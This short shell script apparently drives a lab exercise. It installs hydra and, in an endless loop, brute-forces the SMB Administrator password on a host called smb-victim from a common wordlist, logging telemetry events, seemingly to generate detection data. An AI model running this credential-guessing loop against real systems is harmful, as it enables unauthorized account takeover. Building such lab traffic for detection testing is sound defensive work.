#!/bin/sh
# hydra against smb-victim - emulates Windows-style SMB auth failures (lab).
apk add --no-cache hydra >/dev/null || exit 1
. /lab-telemetry.sh
echo "[smb-bruteforce] waiting for Samba..."
sleep 25
while true; do
  echo "[smb-bruteforce] burst against //smb-victim (Administrator)"
  hydra -l Administrator -P /wordlists/common.txt smb://smb-victim -t 4 -F 2>&1 | tail -n 30 || true
  lab_ssh_brute_event LAB_SMB_HYDRA 20 2100
  sleep 120
done
